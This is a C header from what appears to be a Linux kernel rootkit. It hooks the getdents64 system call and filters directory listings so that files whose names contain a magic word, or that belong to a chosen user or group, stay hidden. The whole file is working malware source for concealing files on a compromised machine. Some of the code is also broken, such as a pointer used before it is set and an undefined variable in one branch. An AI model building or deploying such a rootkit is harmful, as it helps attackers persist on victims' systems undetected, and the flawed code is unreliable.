#pragma once

#include "rootkit.h"
#include <linux/cred.h>
#include <linux/linkage.h>
#include <linux/stddef.h>
#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/proc_ns.h>


extern char* MAGIC_WORD;

/* Just so we know what the linux_dirent looks like.
   actually defined in fs/readdir.c
   exported in linux/syscalls.h
struct linux_dirent {
	unsigned long	d_ino;
	unsigned long	d_off;
	unsigned short	d_reclen;
	char		d_name[];
};
*/


int __always_inline evil(struct linux_dirent __user * dirent, int res, int fd) {    
    int err;
	unsigned long off = 0;
	struct linux_dirent64 *dir, *kdirent, *prev = NULL;

    kdirent = kzalloc(res, GFP_KERNEL);
	if (kdirent == NULL){
        printk(KERN_DEBUG "kzalloc failed\n");
		return res;
    }

	err = copy_from_user(kdirent, dirent, res);
	if (err){
        printk(KERN_DEBUG "can not copy from user!\n");
		goto out;
    }

    int (*vfs_fstat_ptr)(int, struct kstat *) = (int (*)(int,  struct kstat *))lookup_name("vfs_fstat");

    struct kstat *stat = kzalloc(sizeof(struct kstat), GFP_KERNEL);
    int user;
    int group;
    err = vfs_fstat_ptr(fd, stat);
    if (err){
        printk(KERN_DEBUG "can not read file attributes!\n");
		goto out;
    }
    user = (int)stat->uid.val;
    group = (int)stat->gid.val;
    kfree(stat);

    printk(KERN_DEBUG "%s belongs to %i:%i!\n", dir->d_name, user, group);

	while (off < res) {
		dir = (void *)kdirent + off;
		if (strstr(dir->d_name, MAGIC_WORD)
            || user == USER_HIDE
            || group == GROUP_HIDE) {
			if (dir == kdirent) {
				res -= dir->d_reclen;
				memmove(dir, (void *)dir + dir->d_reclen, res);
				continue;
			}
			prev->d_reclen += dir->d_reclen;
		} else
			prev = dir;
		off += dir->d_reclen;
	}
	err = copy_to_user(dirent, kdirent, res);
	if (err){
        printk(KERN_DEBUG "can not copy back to user!\n");
		goto out;
    }
    out:
	    kfree(kdirent);
    return res;
}
#ifdef PTREGS_SYSCALL_STUBS
static asmlinkage long (*orig_sys_getdents64)(const struct pt_regs*);

static asmlinkage int hook_sys_getdents64(const struct pt_regs* regs) {
    struct linux_dirent __user *dirent = SECOND_ARG(regs, struct linux_dirent __user *);
    unsigned int fd = FIRST_ARG(regs, unsigned int);
    int res;
    
    res = orig_sys_getdents64(regs);


    if (res <= 0){
        // The original getdents failed - we aint mangling with that.
		return res;
    }

    res = evil(dirent, res, fd);
    
    return res;
}
#else
static asmlinkage long (*orig_sys_getdents64)(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);

static asmlinkage int hook_sys_getdents64(unsigned int fd, struct linux_dirent __user *dirent, unsigned int count) {
    int res;
    
    res = orig_sys_getdents64(regs);


    if (res <= 0){
        // The original getdents failed - we aint mangling with that.
		return res;
    }

    res = evil(dirent, res, fd);
    
    return res;
}
#endif
